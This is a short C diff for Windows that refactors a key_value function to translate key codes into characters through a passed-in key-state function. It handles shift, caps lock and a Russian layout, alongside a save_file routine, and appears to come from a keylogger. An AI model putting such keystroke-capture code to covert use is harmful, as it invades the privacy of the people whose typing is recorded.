@@ -54,15 +54,15 @@ void save_file(const char *filename, const char *key){
     }
 }
 
-const char* key_value(const int code){
+const char* key_value(const int code, getStateKey keystate){
 	bool is_shift = false;
 	bool is_caps = false;
 	bool is_upper = false;
-	is_shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-	is_upper = is_shift;
 	if(code >= 0 && code <= 255 && code != VK_CAPITAL && keys[code].en_key != NULL){
+        is_shift = (keystate(VK_SHIFT) & 0x8000) != 0;
+        is_upper = is_shift;
         if (code >= VK_A && code <= VK_Z) {
-            is_caps = (GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0;
+            is_caps = (keystate(VK_CAPITAL) & 0x0001) != 0;
             is_upper = is_shift ^ is_caps;
         }
         if(is_key_ru()){
